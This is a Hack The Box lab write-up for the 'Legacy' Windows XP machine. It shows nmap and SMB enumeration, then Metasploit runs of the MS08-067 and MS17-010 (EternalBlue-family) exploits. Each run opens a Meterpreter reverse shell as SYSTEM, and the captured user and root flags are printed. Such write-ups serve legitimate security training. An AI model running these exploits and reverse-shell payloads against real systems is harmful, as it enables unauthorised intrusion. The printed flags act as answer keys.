# Legacy - 10.10.10.4


Hack the box

## In brief
- nmap Port 139/445 NetBios/SMB open 
- nmap -A : Identify XP sp3 English
- nmap --script SMB-vuln* -p 139 10.10.10.4
- msfconsole  
   - exploit/windows/smb/ms17_010_psexec
   - exploit/windows/smb/ms08_067_netapi target=7 (XP SP3 Eng)



## [nmap]
```
# nmap -A -sC -sV -p- 10.10.10.4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 17:14 CET
Nmap scan report for 10.10.10.4
Host is up (0.043s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
```
- _445/tcp  open   microsoft-ds  Windows XP microsoft-ds_
```
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (88%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2

Aggressive OS guesses: 
```
- _Microsoft Windows XP SP3 (94%)_
```
, Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows XP SP2 or Windows Server 2003 (91%), Microsoft Windows 2003 SP2 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (90%), Microsoft Windows Server 2003 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h47m40s, deviation: 1h24m51s, median: 4d23h47m40s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:30:33 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2019-02-27T20:05:50+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   49.90 ms 10.10.14.1
2   48.17 ms 10.10.10.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 479.33 seconds

```



## [Host]
- Microsoft Windows XP SP3 (94%)



## [139: SMB : NetBIOS over IP]
## [445:  microsoft-ds  Windows XP microsoft-ds: SMB over IP]

### nmblookup

```
# nmblookup -A 10.10.10.4
Looking up status of 10.10.10.4
    LEGACY          <00> -         B <ACTIVE> 
    HTB             <00> - <GROUP> B <ACTIVE> 
    LEGACY          <20> -         B <ACTIVE> 
    HTB             <1e> - <GROUP> B <ACTIVE> 
    HTB             <1d> -         B <ACTIVE> 
    ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 

    MAC Address = 00-50-56-B0-30-33

root@ZenStation:~/htb/legacy# nbtscan 10.10.10.4
Doing NBT name scan for addresses from 10.10.10.4

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
10.10.10.4       LEGACY           <server>  <unknown>        00:50:56:b0:30:33
root@ZenStation:~/htb/legacy# smbmap -H 10.10.10.4
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.4...
[+] IP: 10.10.10.4:445    Name: 10.10.10.4                                        
    Disk                                                      Permissions
    ----                                                      -----------
[!] Access Denied
```

### smbclient

```
root@ZenStation:~/htb/legacy# smbclient -L 10.10.10.4
Enter WORKGROUP\root's password: 
session setup failed: NT_STATUS_INVALID_PARAMETER
root@ZenStation:~/htb/legacy# rpcclient -U "" -N 10.10.10.4
Cannot connect to server.  Error was NT_STATUS_INVALID_PARAMETER
```


### nmap --script SMB-vuln* -p 139 10.10.10.4

```
root@ZenStation:~/htb/legacy# nmap --script smb-vuln* -p 139 10.10.10.4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 17:21 CET
Nmap scan report for 10.10.10.4
Host is up (0.039s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn

Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
```
- _smb-vuln-ms08-067: SMB, XP SP3 => search in msfconsole_
```
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
```
- _smb-vuln-ms17-010: EthernalBlue_ => search in msfconsole_
```
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 10.54 seconds
root@ZenStation:~/htb/legacy# 
```


## [3389/tcp closed ms-wbt-server]
Windows Remote Desktop



## Exploit Ethernal Blue 1 : exploit/windows/smb/ms08_067_netapi

```
msf5> use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
RHOST => 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.14.20
LHOST => 10.10.14.20
msf5 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.20:4444 
[-] 10.10.10.4:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection timed out (10.10.10.4:445).
[*] Exploit completed, but no session was created.
msf5 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.20:4444 
[-] 10.10.10.4:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection timed out (10.10.10.4:445).
[*] Exploit completed, but no session was created.
```
Not working with Automatic Targeting.
```
msf5 exploit(windows/smb/ms08_067_netapi) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows 2003 SP0 Universal
   4   Windows XP SP2 English (AlwaysOn NX)
   5   Windows XP SP2 English (NX)
   6   Windows XP SP3 English (AlwaysOn NX)
   7   Windows XP SP3 English (NX)
   8   Windows XP SP2 Arabic (NX)
   9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
   10  Windows XP SP2 Chinese - Simplified (NX)
   11  Windows XP SP2 Chinese - Traditional (NX)
   12  Windows XP SP2 Czech (NX)
   13  Windows XP SP2 Danish (NX)
   14  Windows XP SP2 German (NX)
   15  Windows XP SP2 Greek (NX)
   16  Windows XP SP2 Spanish (NX)
   17  Windows XP SP2 Finnish (NX)
   18  Windows XP SP2 French (NX)
   19  Windows XP SP2 Hebrew (NX)
   20  Windows XP SP2 Hungarian (NX)
   21  Windows XP SP2 Italian (NX)
   22  Windows XP SP2 Japanese (NX)
   23  Windows XP SP2 Korean (NX)
   24  Windows XP SP2 Dutch (NX)
   25  Windows XP SP2 Norwegian (NX)
   26  Windows XP SP2 Polish (NX)
   27  Windows XP SP2 Portuguese - Brazilian (NX)
   28  Windows XP SP2 Portuguese (NX)
   29  Windows XP SP2 Russian (NX)
   30  Windows XP SP2 Swedish (NX)
   31  Windows XP SP2 Turkish (NX)
   32  Windows XP SP3 Arabic (NX)
   33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
   34  Windows XP SP3 Chinese - Simplified (NX)
   35  Windows XP SP3 Chinese - Traditional (NX)
   36  Windows XP SP3 Czech (NX)
   37  Windows XP SP3 Danish (NX)
   38  Windows XP SP3 German (NX)
   39  Windows XP SP3 Greek (NX)
   40  Windows XP SP3 Spanish (NX)
   41  Windows XP SP3 Finnish (NX)
   42  Windows XP SP3 French (NX)
   43  Windows XP SP3 Hebrew (NX)
   44  Windows XP SP3 Hungarian (NX)
   45  Windows XP SP3 Italian (NX)
   46  Windows XP SP3 Japanese (NX)
   47  Windows XP SP3 Korean (NX)
   48  Windows XP SP3 Dutch (NX)
   49  Windows XP SP3 Norwegian (NX)
   50  Windows XP SP3 Polish (NX)
   51  Windows XP SP3 Portuguese - Brazilian (NX)
   52  Windows XP SP3 Portuguese (NX)
   53  Windows XP SP3 Russian (NX)
   54  Windows XP SP3 Swedish (NX)
   55  Windows XP SP3 Turkish (NX)
   56  Windows 2003 SP1 English (NO NX)
   57  Windows 2003 SP1 English (NX)
   58  Windows 2003 SP1 Japanese (NO NX)
   59  Windows 2003 SP1 Spanish (NO NX)
   60  Windows 2003 SP1 Spanish (NX)
   61  Windows 2003 SP1 French (NO NX)
   62  Windows 2003 SP1 French (NX)
   63  Windows 2003 SP2 English (NO NX)
   64  Windows 2003 SP2 English (NX)
   65  Windows 2003 SP2 German (NO NX)
   66  Windows 2003 SP2 German (NX)
   67  Windows 2003 SP2 Portuguese - Brazilian (NX)
   68  Windows 2003 SP2 Spanish (NO NX)
   69  Windows 2003 SP2 Spanish (NX)
   70  Windows 2003 SP2 Japanese (NO NX)
   71  Windows 2003 SP2 French (NO NX)
   72  Windows 2003 SP2 French (NX)


msf5 exploit(windows/smb/ms08_067_netapi) > set target 7
target => 7
msf5 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.20:4444 
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (179779 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.20:4444 -> 10.10.10.4:1031) at 2019-02-22 18:30:25 +0100

meterpreter > pwd
C:\WINDOWS\system32
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > cat "C:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644fmeterpreter > cat "C:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713meterpreter > 
meterpreter > 
meterpreter > 
```


## Exploit Ethernal Blue 2 : exploit/windows/smb/ms17_010_psexec

```
msf5> search eternal TARGET=XP

Matching Modules
================

   Name                                           Disclosure Date  Rank     Check  Description
   ----                                           ---------------  ----     -----  -----------
   auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
msf5> use exploit/windows/smb/ms17_010_psexec 
msf5 exploit(windows/smb/ms17_010_psexec) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   PowerShell
   2   Native upload
   3   MOF upload


msf5 exploit(windows/smb/ms17_010_psexec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                10.10.10.4                                                      yes       The target address range or CIDR identifier
   RPORT                 445                                                             yes       The Target port
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.20      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



msf5 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.20:4444 
[*] 10.10.10.4:445 - Target OS: Windows 5.1
[*] 10.10.10.4:445 - Filling barrel with fish... done
[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.10.10.4:445 -     [*] Preparing dynamite...
[*] 10.10.10.4:445 -         [*] Trying stick 1 (x86)...Boom!
[*] 10.10.10.4:445 -     [+] Successfully Leaked Transaction!
[*] 10.10.10.4:445 -     [+] Successfully caught Fish-in-a-barrel
[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x82302a88
[*] 10.10.10.4:445 - Built a write-what-where primitive...
[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.4:445 - Selecting native target
[*] 10.10.10.4:445 - Uploading payload... XFEdgVgG.exe
[*] 10.10.10.4:445 - Created \XFEdgVgG.exe...
[+] 10.10.10.4:445 - Service started successfully...
[*] Sending stage (179779 bytes) to 10.10.10.4
[*] 10.10.10.4:445 - Deleting \XFEdgVgG.exe...
[*] Meterpreter session 2 opened (10.10.14.20:4444 -> 10.10.10.4:1032) at 2019-02-22 18:36:25 +0100

meterpreter > 
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```


